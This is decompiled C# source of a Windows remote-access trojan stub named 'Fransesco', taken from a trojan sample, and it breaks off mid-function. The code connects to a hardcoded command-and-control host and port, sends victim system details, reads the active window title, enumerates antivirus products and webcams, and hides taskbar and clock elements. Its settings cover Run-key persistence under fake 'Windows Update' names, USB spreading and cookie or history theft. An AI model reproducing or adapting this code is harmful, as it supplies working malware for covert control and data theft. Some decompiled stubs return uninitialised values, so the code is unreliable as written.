// Decompiled with JetBrains decompiler
// Type: Stub.Fransesco
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A0E0E7A4-E23F-4051-9DEF-AB2E1D12CB51
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-99a5466522471fa6514592bc9bc58db9d9745334118a229088f2fa10c6469211.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
  internal sealed class Fransesco
  {
    private static object Pro;
    public const int SWP_HIDEWINDOW = 128;
    public const int SWP_SHOWWINDOW = 64;
    private const int SPI_SETDESKWALLPAPER = 20;
    private const int SPIF_UPDATEINIFILE = 1;
    public const int SWP_HIDEWINDOW_ = 128;
    public const int SWP_SHOWWINDOW_ = 64;
    public static string SPL = "[endof]";
    private const int SETDESKWALLPAPER = 20;
    private const int UPDATEINIFILE = 1;
    private static byte[] b = new byte[5121];
    public static bool BD = Conversions.ToBoolean("False");
    public static TcpClient C = (TcpClient) null;
    public static bool Cn = false;
    public static string DR = "AppData";
    public static string EXE = "server.exe";
    public static Computer F = new Computer();
    public static FileStream FS;
    public static string H = "FRANSESCOTg1LjI0Ny4xNDFRANSESCOuNDFRANSESCOStrik";
    public static string w = "";
    public static string m = "Windows to Erorr ";
    public static string s = "Windows Erorr";
    public static string n = "Microsoft Corporation";
    public static string q = "Windows Update";
    public static string r = "10";
    public static string g = "Explower";
    public static string o = "Notepad.exe";
    public static string k = "[k]";
    public static string z = "";
    public static string v = "Java Update";
    public static string j = "Adobe Update";
    public static string d = "system";
    public static string l = "SoftwareMicrosoftWindowsCurrentVersionRun";
    public static string x = "";
    public static string i = "[i]";
    public static string u = "[Software\\Microsoft\\Windows\\CurrentVersion\\Run]";
    public static bool Idr = Conversions.ToBoolean("True");
    public static bool IsF = Conversions.ToBoolean("True");
    public static bool Isu = Conversions.ToBoolean("False");
    public static bool oad = Conversions.ToBoolean("True");
    public static bool wab = Conversions.ToBoolean("True");
    public static bool rdn = Conversions.ToBoolean("False");
    public static bool rdp = Conversions.ToBoolean("False");
    public static bool err = Conversions.ToBoolean("False");
    public static bool rda = Conversions.ToBoolean("False");
    public static bool rdi = Conversions.ToBoolean("False");
    public static bool str = Conversions.ToBoolean("True");
    public static bool sty = Conversions.ToBoolean("False");
    public static bool ckp = Conversions.ToBoolean("True");
    public static bool Hid = Conversions.ToBoolean("True");
    public static bool Usb = Conversions.ToBoolean("True");
    public static bool tsk = Conversions.ToBoolean("False");
    public static bool nam = Conversions.ToBoolean("False");
    public static bool por = Conversions.ToBoolean("False");
    public static bool ser = Conversions.ToBoolean("True");
    public static bool top = Conversions.ToBoolean("True");
    public static bool prg = Conversions.ToBoolean("True");
    public static bool cok = Conversions.ToBoolean("True");
    public static bool fav = Conversions.ToBoolean("True");
    public static bool nat = Conversions.ToBoolean("True");
    public static bool Dat = Conversions.ToBoolean("True");
    public static bool Myd = Conversions.ToBoolean("True");
    public static bool Mus = Conversions.ToBoolean("False");
    public static bool his = Conversions.ToBoolean("True");
    public static bool cmd = Conversions.ToBoolean("False");
    public static bool prs = Conversions.ToBoolean("False");
    public static bool spy = Conversions.ToBoolean("False");
    public static bool sbi = Conversions.ToBoolean("False");
    public static bool ess = Conversions.ToBoolean("False");
    public static bool war = Conversions.ToBoolean("False");
    public static bool dns = Conversions.ToBoolean("False");
    public static bool tag = Conversions.ToBoolean("False");
    public static bool aip = Conversions.ToBoolean("False");
    public static bool sms = Conversions.ToBoolean("False");
    public static bool rcd = Conversions.ToBoolean("False");
    public static bool san = Conversions.ToBoolean("False");
    public static bool ger = Conversions.ToBoolean("False");
    public static bool mas = Conversions.ToBoolean("False");
    public static bool ils = Conversions.ToBoolean("False");
    public static bool @ref = Conversions.ToBoolean("False");
    public static bool rfl = Conversions.ToBoolean("False");
    public static bool exl = Conversions.ToBoolean("False");
    public static bool ilc = Conversions.ToBoolean("False");
    public static bool loc = Conversions.ToBoolean("False");
    public static bool pad = Conversions.ToBoolean("True");
    public static bool jva = Conversions.ToBoolean("False");
    public static bool exp = Conversions.ToBoolean("False");
    public static bool sst = Conversions.ToBoolean("True");
    public static bool ter = Conversions.ToBoolean("False");
    public static bool trr = Conversions.ToBoolean("True");
    public static bool usd = Conversions.ToBoolean("False");
    public static bool spr = Conversions.ToBoolean("True");
    public static bool MEL = Conversions.ToBoolean("False");
    public static bool MIN = Conversions.ToBoolean("False");
    private static string lastcap = "";
    public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);
    private static MemoryStream MeM = new MemoryStream();
    public static object MT = (object) null;
    public static string P = "NTU1NQ==";
    public static object PLG = (object) null;
    public static string RG = "686212db4c5a50a9b2fe88a2b109202c";
    public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    public static string VN = "SGFjS2Vk";
    public static string VR = "0.7d";
    public static string Y = "|'|'|";

    [DebuggerNonUserCode]
    public Fransesco()
    {
    }

    private static void Lambda1(object a0) => Fransesco.Ind((byte[]) a0);

    private static void Lambda2(object a0, SessionEndingEventArgs a1) => Fransesco.ED();

    public static string ACT()
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = Fransesco.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
          return "";
        string str2 = Strings.Space(checked (Fransesco.GetWindowTextLength((long) foregroundWindow) + 1));
        Fransesco.GetWindowText(foregroundWindow, ref str2, str2.Length);
        str1 = Fransesco.ENB(ref str2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str1 = "";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);

    public static bool Cam()
    {
      try
      {
        int num = 0;
        do
        {
          string str1 = (string) null;
          int wDriver = (int) checked ((short) num);
          string str2 = Strings.Space(100);
          ref string local1 = ref str2;
          ref string local2 = ref str1;
          if (Fransesco.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return true;
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return false;
    }

    public static bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer)
    {
      bool driverDescriptionA;
      return driverDescriptionA;
    }

    private static bool CompDir(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }

    public static bool connect()
    {
      Fransesco.Cn = false;
      Thread.Sleep(2000);
      lock (Fransesco.LO)
      {
        try
        {
          if (Fransesco.C != null)
          {
            try
            {
              Fransesco.C.Close();
              Fransesco.C = (TcpClient) null;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            Fransesco.MeM.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          Fransesco.MeM = new MemoryStream();
          Fransesco.C = new TcpClient();
          Fransesco.C.ReceiveBufferSize = 204800;
          Fransesco.C.SendBufferSize = 204800;
          Fransesco.C.Client.SendTimeout = 10000;
          Fransesco.C.Client.ReceiveTimeout = 10000;
          Fransesco.C.Connect(Fransesco.H, Conversions.ToInteger(Fransesco.P));
          Fransesco.Cn = true;
          Fransesco.Send(Fransesco.inf());
          try
          {
            string str1;
            string str2;
            if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(Fransesco.GTV("vn", (object) "")), (object) "", false))
            {
              str2 = str1 + Fransesco.DEB(ref Fransesco.VN) + "<9";
            }
            else
            {
              string str3 = str1;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(Fransesco.GTV("vn", (object) "")));
              string str4 = Fransesco.DEB(ref s);
              str2 = str3 + str4 + "<9";
            }
            string s1 = str2 + Fransesco.H + Fransesco.w + Fransesco.m + Fransesco.s + Fransesco.x + Fransesco.n + Fransesco.q + Fransesco.r + Fransesco.g + Fransesco.o + Fransesco.u + Fransesco.k + Fransesco.v + Fransesco.j + Fransesco.z + Fransesco.d + Fransesco.i + Fransesco.Y + ":" + Fransesco.P + ":" + Fransesco.P + "<9" + Fransesco.DR + "<9" + Fransesco.EXE + "<9" + Conversions.ToString(Fransesco.Idr) + "<9" + Conversions.ToString(Fransesco.IsF) + "<9" + Conversions.ToString(Fransesco.Isu) + "<9" + Conversions.ToString(Fransesco.oad) + "<" + Conversions.ToString(Fransesco.wab) + "9<" + Conversions.ToString(Fransesco.rdn) + "9<" + Conversions.ToString(Fransesco.rdp) + "<9" + Conversions.ToString(Fransesco.err) + "<9" + Conversions.ToString(Fransesco.rda) + "<9" + Conversions.ToString(Fransesco.rdi) + "<9" + Conversions.ToString(Fransesco.str) + "<9" + Conversions.ToString(Fransesco.sty) + "<9" + Conversions.ToString(Fransesco.ckp) + "<9" + Conversions.ToString(Fransesco.Hid) + "<9" + Conversions.ToString(Fransesco.Usb) + "<9" + Conversions.ToString(Fransesco.tsk) + "<9" + Conversions.ToString(Fransesco.nam) + "<9" + Conversions.ToString(Fransesco.por) + "<9" + Conversions.ToString(Fransesco.ser) + "<9" + Conversions.ToString(Fransesco.top) + "<9" + Conversions.ToString(Fransesco.prg) + "<9" + Conversions.ToString(Fransesco.cok) + "<9" + Conversions.ToString(Fransesco.fav) + "<9" + Conversions.ToString(Fransesco.nat) + "<9" + Conversions.ToString(Fransesco.Dat) + "<9" + Conversions.ToString(Fransesco.Myd) + "<9" + Conversions.ToString(Fransesco.Mus) + "<9" + Conversions.ToString(Fransesco.his) + "<9" + Conversions.ToString(Fransesco.cmd) + "<9" + Conversions.ToString(Fransesco.fav) + "<9" + Conversions.ToString(Fransesco.spy) + "<9" + Conversions.ToString(Fransesco.dns) + "<9" + Conversions.ToString(Fransesco.ess) + "<9" + Conversions.ToString(Fransesco.exp) + "<9" + Conversions.ToString(Fransesco.aip) + "<9" + Conversions.ToString(Fransesco.war) + "<9" + Conversions.ToString(Fransesco.prs) + "<9" + Conversions.ToString(Fransesco.sbi) + "<9" + Conversions.ToString(Fransesco.tag) + "<9" + Conversions.ToString(Fransesco.sms) + "<9" + Conversions.ToString(Fransesco.rcd) + "<9" + Conversions.ToString(Fransesco.spr) + "<9" + Conversions.ToString(Fransesco.ger) + "<9" + Conversions.ToString(Fransesco.ils) + "<9" + Conversions.ToString(Fransesco.san) + "<9" + Conversions.ToString(Fransesco.loc) + "<9" + Conversions.ToString(Fransesco.@ref) + "<9" + Conversions.ToString(Fransesco.rfl) + "<9" + Conversions.ToString(Fransesco.mas) + "<9" + Conversions.ToString(Fransesco.pad) + "<9" + Conversions.ToString(Fransesco.jva) + "<9" + Conversions.ToString(Fransesco.ilc) + "<9" + Conversions.ToString(Fransesco.usd) + "<9" + Conversions.ToString(Fransesco.exl) + "<9" + Conversions.ToString(Fransesco.sst) + "<9" + Conversions.ToString(Fransesco.ter) + "<9" + Conversions.ToString(Fransesco.trr) + "<9" + Conversions.ToString(Fransesco.MEL) + "<9" + Conversions.ToString(Fransesco.MIN) + "<9" + Conversions.ToString(Fransesco.BD);
            Fransesco.Send("inf" + Fransesco.Y + Fransesco.ENB(ref s1));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          Fransesco.Cn = false;
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      return Fransesco.Cn;
    }

    public static string DEB(ref string s)
    {
      byte[] B = Convert.FromBase64String(s);
      return Fransesco.BS(ref B);
    }

    public static void DLV(string n)
    {
      try
      {
        Fransesco.F.Registry.CurrentUser.OpenSubKey("Software\\" + Fransesco.RG, true).DeleteValue(n);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static void ED() => Fransesco.pr(0);

    public static string ENB(ref string s) => Convert.ToBase64String(Fransesco.SB(ref s));

    public static IntPtr GetForegroundWindow()
    {
      IntPtr foregroundWindow;
      return foregroundWindow;
    }

    private static int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize)
    {
      int volumeInformation;
      return volumeInformation;
    }

    public static int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength)
    {
      int windowText;
      return windowText;
    }

    public static int GetWindowTextLength(long hwnd)
    {
      int windowTextLength;
      return windowTextLength;
    }

    public static object GTV(string n, object ret)
    {
      object objectValue;
      try
      {
        objectValue = RuntimeHelpers.GetObjectValue(Fransesco.F.Registry.CurrentUser.OpenSubKey("Software\\" + Fransesco.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret)))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        objectValue = RuntimeHelpers.GetObjectValue(ret);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return objectValue;
    }

    public static string GetAV()
    {
      string av;
      int num1;
      try
      {
label_2:
        int num2 = 1;
        object obj = (object) "Select * From AntiVirusProduct";
label_3:
        num2 = 2;
        object objectValue1 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\.\\root\\SecurityCenter2"))))))));
label_4:
        num2 = 3;
        object[] Arguments = new object[1]
        {
          RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(obj)))))))
        };
        bool[] CopyBack = new bool[1]{ true };
        if (CopyBack[0])
          obj = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0])))))));
        object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue1))), (System.Type) null, "ExecQuery", Arguments, (string[]) null, (System.Type[]) null, CopyBack))))))));
label_7:
        num2 = 4;
        IEnumerator enumerator = ((IEnumerable) objectValue2).GetEnumerator();
        goto label_12;
label_9:
        int num3 = 1;
label_10:
        num2 = 6;
        object objectValue3;
        av = NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue3))), (System.Type) null, "displayName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null).ToString();
        goto label_20;
label_12:
        if (enumerator.MoveNext())
        {
          objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current)))))));
          goto label_9;
        }
        else if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
label_16:
        num2 = 8;
        av = "Couldn´t detect AV";
        goto label_20;
label_18:
        num1 = num2;
        switch (num3)
        {
          case 1:
            num1 = 0;
            switch (checked (num1 + 1))
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
                goto label_7;
              case 5:
                goto label_9;
              case 6:
                goto label_10;
              case 7:
                num2 = 7;
                goto label_12;
              case 8:
                goto label_16;
            }
            break;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        goto label_18;
      }
label_20:
      if (num1 == 0)
        ;
      return av;
    }

    public static string HWD()
    {
      string str;
      try
      {
        string lpVolumeNameBuffer = (string) null;
        int lpMaximumComponentLength = 0;
        int lpFileSystemFlags = 0;
        string lpFileSystemNameBuffer = (string) null;
        string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
        int lpVolumeSerialNumber;
        Fransesco.GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
        str = Conversion.Hex(lpVolumeSerialNumber);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str = "ERR";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static byte[] ZIP(byte[] B, ref bool CM)
    {
      if (CM)
      {
        object Instance1 = (object) new MemoryStream();
        object Instance2 = (object) new GZipStream((Stream) Instance1, CompressionMode.Compress, true);
        object Instance3 = Instance2;
        object[] objArray1 = new object[3]
        {
          (object) B,
          (object) 0,
          (object) B.Length
        };
        object[] Arguments1 = objArray1;
        bool[] flagArray1 = new bool[3]
        {
          true,
          false,
          false
        };
        bool[] CopyBack1 = flagArray1;
        NewLateBinding.LateCall(Instance3, (System.Type) null, "Write", Arguments1, (string[]) null, (System.Type[]) null, CopyBack1, true);
        if (flagArray1[0])
          B = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
        NewLateBinding.LateCall(Instance2, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateSet(Instance1, (System.Type) null, "Position", new object[1]
        {
          (object) 0
        }, (string[]) null, (System.Type[]) null);
        byte[] numArray = new byte[checked (Conversions.ToInteger(NewLateBinding.LateGet(Instance1, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)) + 1)];
        object Instance4 = Instance1;
        object[] objArray2 = new object[3]
        {
          (object) numArray,
          (object) 0,
          (object) numArray.Length
        };
        object[] Arguments2 = objArray2;
        bool[] flagArray2 = new bool[3]
        {
          true,
          false,
          false
        };
        bool[] CopyBack2 = flagArray2;
        NewLateBinding.LateCall(Instance4, (System.Type) null, "Read", Arguments2, (string[]) null, (System.Type[]) null, CopyBack2, true);
        if (flagArray2[0])
          numArray = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (byte[]));
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        return numArray;
      }
      object Instance5 = (object) new MemoryStream(B);
      object Instance6 = (object) new GZipStream((Stream) Instance5, CompressionMode.Decompress);
      byte[] numArray1 = new byte[4];
      NewLateBinding.LateSet(Instance5, (System.Type) null, "Position", new object[1]
      {
        Operators.SubtractObject(NewLateBinding.LateGet(Instance5, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 5)
      }, (string[]) null, (System.Type[]) null);
      object Instance7 = Instance5;
      object[] objArray3 = new object[3]
      {
        (object) numArray1,
        (object) 0,
        (object) 4
      };
      object[] Arguments3 = objArray3;
      bool[] flagArray3 = new bool[3]{ true, false, false };
      bool[] CopyBack3 = flagArray3;
      NewLateBinding.LateCall(Instance7, (System.Type) null, "Read", Arguments3, (string[]) null, (System.Type[]) null, CopyBack3, true);
      if (flagArray3[0])
        numArray1 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof (byte[]));
      int int32 = BitConverter.ToInt32(numArray1, 0);
      NewLateBinding.LateSet(Instance5, (System.Type) null, "Position", new object[1]
      {
        (object) 0
      }, (string[]) null, (System.Type[]) null);
      byte[] numArray2 = new byte[checked (int32 - 1 + 1)];
      object Instance8 = Instance6;
      object[] objArray4 = new object[3]
      {
        (object) numArray2,
        (object) 0,
        (object) int32
      };
      object[] Arguments4 = objArray4;
      bool[] flagArray4 = new bool[3]{ true, false, true };
      bool[] CopyBack4 = flagArray4;
      NewLateBinding.LateCall(Instance8, (System.Type) null, "Read", Arguments4, (string[]) null, (System.Type[]) null, CopyBack4, true);
      if (flagArray4[0])
        numArray2 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[0]), typeof (byte[]));
      if (flagArray4[2])
      {
        int num = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[2]), typeof (int));
      }
      NewLateBinding.LateCall(Instance6, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      NewLateBinding.LateCall(Instance5, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      return numArray2;
    }

    public static string IconsToggle()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        IntPtr window = e.FindWindow("ProgMan", (string) null);
label_3:
        num3 = 3;
        window = e.GetWindow(window, 5U);
label_4:
        num3 = 4;
        if (!e.IsWindowVisible(window))
          goto label_6;
label_5:
        num3 = 5;
        e.ShowWindow(window, 0);
        goto label_8;
label_6:
        num3 = 7;
label_7:
        num3 = 8;
        e.ShowWindow(window, 4);
label_8:
        goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
              case 9:
                goto label_8;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 10:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      string str1;
      string str2 = str1;
      if (num2 == 0)
        return str2;
      ProjectData.ClearProjectError();
      return str2;
    }

    [DllImport("user32.dll", EntryPoint = "FindWindowExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindowEx(
      int hWnd1,
      int hWnd2,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);

    private static void RS(object a, object e)
    {
      try
      {
        string y = Fransesco.Y;
        object Instance = e;
        string s = Conversions.ToString(NewLateBinding.LateGet(Instance, (System.Type) null, "Data", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        string str = Fransesco.ENB(ref s);
        NewLateBinding.LateSetComplex(Instance, (System.Type) null, "Data", new object[1]
        {
          (object) s
        }, (string[]) null, (System.Type[]) null, true, false);
        Fransesco.Send("rs" + y + str);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ex()
    {
      try
      {
        Fransesco.Send("rsc");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string HideTaskbarItems()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        long window = (long) e.FindWindow("Shell_TrayWnd", (string) null);
label_3:
        num3 = 3;
        int hWnd1 = checked ((int) window);
        string str1 = "ReBarWindow32";
        ref string local1 = ref str1;
        string str2 = (string) null;
        ref string local2 = ref str2;
        long windowEx = (long) Fransesco.FindWindowEx(hWnd1, 0, ref local1, ref local2);
label_4:
        num3 = 4;
        e.ShowWindow((IntPtr) windowEx, 1);
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      string str3;
      string str4 = str3;
      if (num2 == 0)
        return str4;
      ProjectData.ClearProjectError();
      return str4;
    }

    public static string ShowTaskbarItems()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        long window = (long) e.FindWindow("Shell_TrayWnd", (string) null);
label_3:
        num3 = 3;
        int hWnd1 = checked ((int) window);
        string str1 = "ReBarWindow32";
        ref string local1 = ref str1;
        string str2 = (string) null;
        ref string local2 = ref str2;
        long windowEx = (long) Fransesco.FindWindowEx(hWnd1, 0, ref local1, ref local2);
label_4:
        num3 = 4;
        e.ShowWindow((IntPtr) windowEx, 0);
        goto label_11;
label_6:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      string str3;
      string str4 = str3;
      if (num2 == 0)
        return str4;
      ProjectData.ClearProjectError();
      return str4;
    }

    public static string hideclock()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        long window = (long) e.FindWindow("Shell_TrayWnd", (string) null);
label_3:
        num3 = 3;
        int hWnd1_1 = checked ((int) window);
        string str1 = "TrayNotifyWnd";
        ref string local1 = ref str1;
        string str2 = (string) null;
        ref string local2 = ref str2;
        long windowEx1 = (long) Fransesco.FindWindowEx(hWnd1_1, 0, ref local1, ref local2);
label_4:
        num3 = 4;
        int hWnd1_2 = checked ((int) windowEx1);
        string str3 = "TrayClockWClass";
        ref string local3 = ref str3;
        string str4 = (string) null;
        ref string local4 = ref str4;
        long windowEx2 = (long) Fransesco.FindWindowEx(hWnd1_2, 0, ref local3, ref local4);
label_5:
        num3 = 5;
        e.ShowWindow((IntPtr) windowEx2, 0);
        goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      string str5;
      string str6 = str5;
      if (num2 == 0)
        return str6;
      ProjectData.ClearProjectError();
      return str6;
    }

    public static string showclock()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        long window = (long) e.FindWindow("Shell_TrayWnd", (string) null);
label_3:
